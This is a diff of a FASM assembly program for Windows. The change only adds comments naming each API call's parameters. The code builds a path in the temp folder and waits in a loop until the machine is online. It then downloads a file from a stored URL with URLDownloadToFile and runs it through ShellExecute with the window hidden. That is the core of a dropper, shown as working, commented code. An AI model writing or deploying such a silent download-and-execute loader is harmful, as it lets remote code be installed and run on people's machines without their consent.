@@ -42,91 +42,91 @@ section '.data' data readable writable
 section '.code' code readable executable
 
         start:
-                push tmpDir
-                push tmpDir
+                push tmpDir        ; [out] LPSTR lpBuffer
+                push tmpDir        ; [in]  DWORD nBufferLength
                 call [GetTempPath] ; stdcall (calling conventions)
 ;----------------------------------------------------------------------------------------------
-                push tmpDir
-                push fileDir
-                push fileDir
+                push tmpDir     ; const char *src
+                push fileDir    ; rsize_t dest_size
+                push fileDir    ; char *dest
                 call [strcpy_s] ; cdecl (calling conventions)
 
-                mov eax,4   ; size (4 bytes == 32 bit)
-                mov ebx,3   ; number of arguments
-                mul ebx     ; 4 * 3
-                add esp,eax ; clear stack
+                mov eax,4       ; size (4 bytes == 32 bits)
+                mov ebx,3       ; number of arguments
+                mul ebx         ; 4 * 3
+                add esp,eax     ; clear stack
 ;----------------------------------------------------------------------------------------------
-                push fileName
-                push fileDir
-                push fileDir
+                push fileName   ; const char *strSource
+                push fileDir    ; size_t numberOfElements
+                push fileDir    ; char *strDestination
                 call [strcat_s] ; cdecl (calling conventions)
 
-                mov eax,4   ; size (4 bytes == 32 bit)
-                mov ebx,3   ; number of arguments
-                mul ebx     ; 4 * 3
-                add esp,eax ; clear stack
+                mov eax,4       ; size (4 bytes == 32 bits)
+                mov ebx,3       ; number of arguments
+                mul ebx         ; 4 * 3
+                add esp,eax     ; clear stack
 ;----------------------------------------------------------------------------------------------
-                push s1
-                push param
-                push param
+                push s1         ; const char *src
+                push param      ; rsize_t dest_size
+                push param      ; char *dest
                 call [strcpy_s] ; cdecl (calling conventions)
 
-                mov eax,4   ; size (4 bytes == 32 bit)
-                mov ebx,3   ; number of arguments
-                mul ebx     ; 4 * 3
-                add esp,eax ; clear stack
+                mov eax,4       ; size (4 bytes == 32 bits)
+                mov ebx,3       ; number of arguments
+                mul ebx         ; 4 * 3
+                add esp,eax     ; clear stack
 ;----------------------------------------------------------------------------------------------
-                push fileDir
-                push param
-                push param
+                push fileDir    ; const char *strSource
+                push param      ; size_t numberOfElements
+                push param      ; char *strDestination
                 call [strcat_s] ; cdecl (calling conventions)
 
-                mov eax,4   ; size (4 bytes == 32 bit)
-                mov ebx,3   ; number of arguments
-                mul ebx     ; 4 * 3
-                add esp,eax ; clear stack
+                mov eax,4       ; size (4 bytes == 32 bits)
+                mov ebx,3       ; number of arguments
+                mul ebx         ; 4 * 3
+                add esp,eax     ; clear stack
 ;----------------------------------------------------------------------------------------------
 restart:
-                push fileDir
+                push fileDir          ; [in] LPCSTR pszPath
                 call [PathFileExists] ; stdcall (calling conventions)
                 cmp eax,0
-                jz download ; false
-                jne execute ; true
+                jz download           ; false
+                jne execute           ; true
 download:
-                push 0
-                push 0
+                push 0                           ; [in]  DWORD   dwReserved
+                push 0                           ; [out] LPDWORD lpdwFlags
                 call [InternetGetConnectedState] ; stdcall (calling conventions)
                 cmp eax,0
-                jz sleep ; false
+                jz sleep                         ; false
 
-                push 0
-                push 0
-                push fileDir
-                push url
-                push 0
+                push 0                   ;            LPBINDSTATUSCALLBACK lpfnCB
+                push 0                   ; _Reserved_ DWORD                dwReserved
+                push fileDir             ;            LPCTSTR              szFileName
+                push url                 ;            LPCTSTR              szURL
+                push 0                   ;            LPUNKNOWN            pCaller
                 call [URLDownloadToFile] ; stdcall (calling conventions)
                 cmp eax,0
-                jne sleep  ; false
-                jz execute ; true
+                jne sleep                ; false
+                jz execute               ; true
 execute:
-                push 0
-                push 0
-                push param
-                push s3
-                push s2
-                push 0
+                push 0              ; [in]           INT    nShowCmd
+                push 0              ; [in, optional] LPCSTR lpDirectory
+                push param          ; [in, optional] LPCSTR lpParameters
+                push s3             ; [in]           LPCSTR lpFile
+                push s2             ; [in, optional] LPCSTR lpOperation
+                push 0              ; [in, optional] HWND   hwnd
                 call [ShellExecute] ; stdcall (calling conventions)
                 jmp exit
 sleep:
                 mov eax,[sleepSeconds]
                 mov ebx,1000
-                mul ebx
+                mul ebx      ; sleepSeconds * 1000
 
-                push eax
+                push eax     ; [in] DWORD dwMilliseconds
                 call [Sleep] ; stdcall (calling conventions)
                 jmp restart
 exit:
-                push 0
+                push 0             ; [in] UINT uExitCode
                 call [ExitProcess] ; stdcall (calling conventions)
 
 section '.idata' import data readable
